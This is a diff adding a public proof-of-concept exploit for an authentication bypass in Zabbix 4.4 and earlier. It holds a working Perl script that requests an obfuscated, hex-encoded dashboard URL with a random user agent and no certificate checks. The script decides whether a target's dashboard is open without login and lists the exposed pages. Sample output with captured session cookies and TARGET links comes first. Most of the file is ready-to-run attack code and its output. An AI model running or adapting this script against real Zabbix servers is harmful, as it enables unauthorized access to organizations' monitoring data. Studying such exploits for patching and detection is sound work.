@@ -1,0 +1,123 @@
+# Exploit Title: Zabbix 4.4 - Authentication Bypass
+# Date: 2019-10-06
+# Exploit Author: Todor Donev
+# Software Link: https://www.zabbix.com/download
+# Version: Zabbix 4.4
+# Tested on: Linux Apache/2 PHP/7.2
+
+#
+#  Zabbix <= 4.4  Authentication Bypass Demo PoC Exploit
+#
+#  Copyright 2019 (c) Todor Donev 
+#
+#  Disclaimer:
+#  This or previous programs are for Educational purpose ONLY. Do not use it without permission. 
+#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages 
+#  caused by direct or indirect use of the  information or functionality provided by these programs. 
+#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs 
+#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss, 
+#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's 
+#  responsibility.
+#   
+#  Use them at your own risk!  
+#  
+#  (Dont do anything without permissions)
+#
+#	#  [ Zabbix <= 4.4  Authentication Bypass Demo PoC Exploit
+#	#  [ Exploit Author: Todor Donev 2019 <todor.donev@gmail.com>
+#	#  [ Initializing the browser
+#	#  [ >>> Referer => 
+#	#  [ >>> User-Agent => Opera/9.61 (Macintosh; Intel Mac OS X; U; de) Presto/2.1.1
+#	#  [ >>> Content-Type => application/x-www-form-urlencoded
+#	#  [ <<< Cache-Control => no-store, no-cache, must-revalidate
+#	#  [ <<< Connection => close
+#	#  [ <<< Date => Mon, 07 Oct 2019 12:29:54 GMT
+#	#  [ <<< Pragma => no-cache
+#	#  [ <<< Server => nginx
+#	#  [ <<< Vary => Accept-Encoding
+#	#  [ <<< Content-Type => text/html; charset=UTF-8
+#	#  [ <<< Expires => Thu, 19 Nov 1981 08:52:00 GMT
+#	#  [ <<< Client-Date => Mon, 07 Oct 2019 12:29:54 GMT
+#	#  [ <<< Client-Peer => 
+#	#  [ <<< Client-Response-Num => 1
+#	#  [ <<< Client-SSL-Cert-Issuer => 
+#	#  [ <<< Client-SSL-Cert-Subject => 
+#	#  [ <<< Client-SSL-Cipher => ECDHE-RSA-AES128-GCM-SHA256
+#	#  [ <<< Client-SSL-Socket-Class => IO::Socket::SSL
+#	#  [ <<< Client-SSL-Warning => Peer certificate not verified
+#	#  [ <<< Client-Transfer-Encoding => chunked
+#	#  [ <<< Link => <favicon.ico>; rel="icon"<assets/img/apple-touch-icon-76x76-precomposed.png>; rel="apple-touch-icon-precomposed"; sizes="76x76"<assets/img/apple-touch-icon-120x120-precomposed.png>; rel="apple-touch-icon-precomposed"; sizes="120x120"<assets/img/apple-touch-icon-152x152-precomposed.png>; rel="apple-touch-icon-precomposed"; sizes="152x152"<assets/img/apple-touch-icon-180x180-precomposed.png>; rel="apple-touch-icon-precomposed"; sizes="180x180"<assets/img/touch-icon-192x192.png>; rel="icon"; sizes="192x192"<assets/styles/dark-theme.css>; rel="stylesheet"; type="text/css"
+#	#  [ <<< Set-Cookie => zbx_sessionid=e125efe43b1f67b0fdbfb4db2fa1ce0d; HttpOnlyPHPSESSID=n4dolnd118fhio9oslok6qpj3a; path=/zabbix/; HttpOnlyPHPSESSID=n4dolnd118fhio9oslok6qpj3a; path=/zabbix/; HttpOnly
+#	#  [ <<< Strict-Transport-Security => max-age=63072000; includeSubdomains; preload
+#	#  [ <<< Title => TARGET: Dashboard
+#	#  [ <<< X-Content-Type-Options => nosniff
+#	#  [ <<< X-Frame-Options => SAMEORIGIN
+#	#  [ <<< X-Meta-Author => Zabbix SIA
+#	#  [ <<< X-Meta-Charset => utf-8
+#	#  [ <<< X-Meta-Csrf-Token => fdbfb4db2fa1ce0d
+#	#  [ <<< X-Meta-Msapplication-Config => none
+#	#  [ <<< X-Meta-Msapplication-TileColor => #d40000
+#	#  [ <<< X-Meta-Msapplication-TileImage => assets/img/ms-tile-144x144.png
+#	#  [ <<< X-Meta-Viewport => width=device-width, initial-scale=1
+#	#  [ <<< X-UA-Compatible => IE=Edge
+#	#  [ <<< X-XSS-Protection => 1; mode=block
+#	#  [
+#	#  [ The target is vulnerable. Try to open these links:
+#	#  [ https://TARGET/zabbix/zabbix.php?action=dashboard.view
+#	#  [ https://TARGET/zabbix/zabbix.php?action=dashboard.view&ddreset=1
+#	#  [ https://TARGET/zabbix/zabbix.php?action=problem.view&ddreset=1
+#	#  [ https://TARGET/zabbix/overview.php?ddreset=1
+#	#  [ https://TARGET/zabbix/zabbix.php?action=web.view&ddreset=1
+#	#  [ https://TARGET/zabbix/latest.php?ddreset=1
+#	#  [ https://TARGET/zabbix/charts.php?ddreset=1
+#	#  [ https://TARGET/zabbix/screens.php?ddreset=1
+#	#  [ https://TARGET/zabbix/zabbix.php?action=map.view&ddreset=1
+#	#  [ https://TARGET/zabbix/srv_status.php?ddreset=1
+#	#  [ https://TARGET/zabbix/hostinventoriesoverview.php?ddreset=1
+#	#  [ https://TARGET/zabbix/hostinventories.php?ddreset=1
+#	#  [ https://TARGET/zabbix/report2.php?ddreset=1
+#	#  [ https://TARGET/zabbix/toptriggers.php?ddreset=1
+#	#  [ https://TARGET/zabbix/zabbix.php?action=dashboard.list
+#	#  [ https://TARGET/zabbix/zabbix.php?action=dashboard.view&dashboardid=1
+# 
+
+#!/usr/bin/perl -w
+
+use strict;
+use HTTP::Request;
+use LWP::UserAgent;
+use WWW::UserAgent::Random;
+use HTML::TreeBuilder;
+my $host = shift || ''; # Full path url to the store
+$host =~ s|/$||;
+print "\033[2J";    #clear the screen
+print "\033[0;0H"; #jump to 0,0
+print "[ Zabbix <= 4.4  Authentication Bypass Demo PoC Exploit\n";
+print "[ Exploit Author: Todor Donev 2019 <todor.donev\@gmail.com>\n";
+print "[ e.g. perl $0 https://target:port/\n" and exit if ($host !~ m/^http/);
+print "[ Initializing the browser\n";
+my $user_agent = rand_ua("browsers");
+my $browser  = LWP::UserAgent->new(protocols_allowed => ['http', 'https'],ssl_opts => { verify_hostname => 0 });
+   $browser->timeout(30);
+   $browser->agent($user_agent);
+my $target = $host."\x2f\x7a\x61\x62\x62\x69\x78\x2f\x7a\x61\x62\x62\x69\x78\x2e\x70\x68\x70\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x2e\x76\x69\x65\x77\x26\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x69\x64\x3d\x31";
+my $request = HTTP::Request->new (GET => $target,[Content_Type => "application/x-www-form-urlencoded",Referer => $host]);                      
+my $response = $browser->request($request);
+print "[ >>> $_ => ", $request->header($_), "\n" for  $request->header_field_names;
+print "[ <<< $_ => ", $response->header($_), "\n" for  $response->header_field_names;
+print "[ Exploit failed! 401 Unauthorized!\n" and exit if ($response->code eq '401');
+print "[ Exploit failed! 403 Forbidden!\n" and exit if ($response->code eq '403');
+if (defined ($response->as_string()) && ($response->as_string() =~ m/Dashboard/)){
+    print "[\n[ The target is vulnerable. Try to open these links:\n";
+    my $tree = HTML::TreeBuilder->new_from_content($response->as_string());
+    my @files = $tree->look_down(_tag => 'a');
+    for my $line (@files){
+        next if ($line->attr('href') =~ m/javascript/);
+        next if ($line->attr('href') =~ m/\#/);
+        next if ($line->attr('href') =~ m/http/);
+        print "[ ", $host."/zabbix/".$line->attr('href'), "\n";
+    }
+} else { 
+        print "[ Exploit failed! The target isn't vulnerable\n";
+        exit;
+}
